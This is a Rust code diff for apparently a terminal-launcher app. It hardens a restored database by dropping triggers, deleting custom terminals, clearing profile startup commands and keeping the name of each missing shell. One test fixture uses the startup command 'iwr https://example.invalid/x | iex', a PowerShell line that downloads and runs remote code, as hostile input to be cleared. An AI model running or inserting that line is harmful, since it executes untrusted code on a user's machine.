@@ -38,7 +38,8 @@ pub struct RestoreReport {
     pub cleared_startup_commands: usize,
     /// Shell profiles that named a custom terminal. Those are all gone by the
     /// time a restore finishes, so each such profile was re-pointed at nothing
-    /// and needs its shell picking again.
+    /// and needs its shell picking again. Each one keeps the name of the
+    /// terminal it wanted, so the launcher can say which shell to re-add.
     pub orphaned_custom_profiles: usize,
     /// Whether the restored file had sudo auto-fill on, in which case it was
     /// turned back off. False when it was already off, i.e. nothing changed.
@@ -236,7 +237,11 @@ pub(crate) struct RestoreHardening {
 /// shell, folder, colour, order) is only a way of opening a shell the operator
 /// could open by hand, so profiles come back and the command is cleared.
 /// Retyping one line per profile is the price, and it puts what runs back in
-/// front of the person whose machine it is.
+/// front of the person whose machine it is. `wanted_shell` is the one field a
+/// restore *writes*: the name of the custom terminal a profile was pointing at,
+/// read off the file's own row before that row is deleted, held to what the
+/// profile form would accept, and shown in a menu. It names a shell, never a
+/// path, and nothing launches from it.
 ///
 /// Every statement here runs against a schema the file supplied. So first every
 /// trigger goes: Broadside defines none, and a `BEFORE DELETE` or `BEFORE
@@ -246,22 +251,31 @@ pub(crate) struct RestoreHardening {
 pub(crate) fn harden_restored_db(conn: &rusqlite::Connection) -> AppResult<RestoreHardening> {
     drop_all_triggers(conn)?;
 
+    // Before the terminals go, because this is the last moment their names can
+    // be read. Every custom terminal is about to be deleted, so a profile
+    // naming one names nothing. `custom_terminals.id` is a plain INTEGER
+    // PRIMARY KEY, which SQLite hands out as max(rowid)+1, so with the table
+    // empty the next terminal the operator adds takes id 1, the one after it 2,
+    // and a profile still holding `custom:1` would silently start launching
+    // whatever programme that turned out to be. Re-pointed at the marker the
+    // import path already uses for a custom terminal this machine does not
+    // have, so the profile shows struck through and stays that way until
+    // somebody says what it should open.
+    //
+    // What it keeps is the *name* of the terminal it was pointing at, which is
+    // text this build shows in a menu and a form and launches nothing from. It
+    // is worth keeping because "pick this profile's shell again" is a poor
+    // instruction when the profile is the only record of which shell that was.
+    // Re-pointing is still what the operator does by hand: the note fills the
+    // Edit form's dropdown in, it does not save it.
+    let orphaned_custom_profiles = crate::db::shell_profiles::orphan_custom_shells(conn)?;
+
     let dropped_terminals = conn.execute("DELETE FROM custom_terminals", [])?;
     let cleared_host_keys = conn.execute("DELETE FROM host_keys", [])?;
     let cleared_startup_commands = conn.execute(
         "UPDATE shell_profiles SET startup_command = '' WHERE startup_command <> ''",
         [],
     )?;
-    // Every custom terminal has just gone, so a profile naming one names
-    // nothing. `custom_terminals.id` is a plain INTEGER PRIMARY KEY, which
-    // SQLite hands out as max(rowid)+1, so with the table empty the next
-    // terminal the operator adds takes id 1, the one after it 2, and a profile
-    // still holding `custom:1` would silently start launching whatever
-    // programme that turned out to be. Re-pointed at the marker the import path
-    // already uses for a custom terminal this machine does not have, so the
-    // profile shows struck through and stays that way until somebody says what
-    // it should open.
-    let orphaned_custom_profiles = crate::db::shell_profiles::orphan_custom_shells(conn)?;
 
     // The one setting that is not a preference. Sudo auto-fill decides whether
     // stored passwords get typed into a session on the host's say-so, and the
@@ -287,6 +301,13 @@ pub(crate) fn harden_restored_db(conn: &rusqlite::Connection) -> AppResult<Resto
         && count(
             conn,
             "SELECT COUNT(*) FROM shell_profiles              WHERE shell_id LIKE 'custom:%' AND shell_id <> 'custom:none'",
+        )? == 0
+        // A name is only ever a note about a missing shell. A file that arrived
+        // with one on a profile that has a shell had it cleared, so this holds
+        // whatever shape the file was.
+        && count(
+            conn,
+            "SELECT COUNT(*) FROM shell_profiles              WHERE wanted_shell <> '' AND shell_id <> 'custom:none'",
         )? == 0
         && !crate::db::settings::get_bool(
             conn,
@@ -547,6 +568,7 @@ mod tests {
                 cwd: r"C:\src".into(),
                 startup_command: "iwr https://example.invalid/x | iex".into(),
                 color: "#3b82f6".into(),
+                wanted_shell: String::new(),
             },
             None,
         )
@@ -603,6 +625,7 @@ mod tests {
                     cwd: String::new(),
                     startup_command: String::new(),
                     color: String::new(),
+                    wanted_shell: String::new(),
                 },
                 None,
             )
@@ -611,9 +634,17 @@ mod tests {
         new("p-1", "Git Bash at work", "custom:1");
         new("p-2", "Also custom", "custom:12");
         new("p-3", "Plain pwsh", "pwsh");
+        live.execute(
+            "INSERT INTO custom_terminals
+                 (id, label, exe_path, args_json, family, sort_order, created_at, updated_at)
+             VALUES (1, 'Git Bash', 'C:\\bash.exe', '[]', 'posix', 0, 'then', 'then')",
+            [],
+        )
+        .unwrap();
 
         let report = harden_restored_db(&live).unwrap();
         assert_eq!(report.orphaned_custom_profiles, 2);
+        assert_eq!(report.dropped_terminals, 1);
 
         assert_eq!(
             profiles::get(&live, "p-1").unwrap().shell_id,
@@ -622,6 +653,18 @@ mod tests {
         assert_eq!(
             profiles::get(&live, "p-2").unwrap().shell_id,
             crate::db::shell_profiles::UNMATCHED_CUSTOM,
+        );
+        // The name of the shell each one wanted, where the file still had it
+        // to read: the operator is told which entry to add back rather than
+        // working it out from the profile's own name.
+        assert_eq!(
+            profiles::get(&live, "p-1").unwrap().wanted_shell,
+            "Git Bash",
+        );
+        assert_eq!(
+            profiles::get(&live, "p-2").unwrap().wanted_shell,
+            "",
+            "id 12 was not in the file, so there is nothing to say",
         );
         let kept = profiles::get(&live, "p-3").unwrap();
         assert_eq!(kept.shell_id, "pwsh", "a normal shell is untouched");
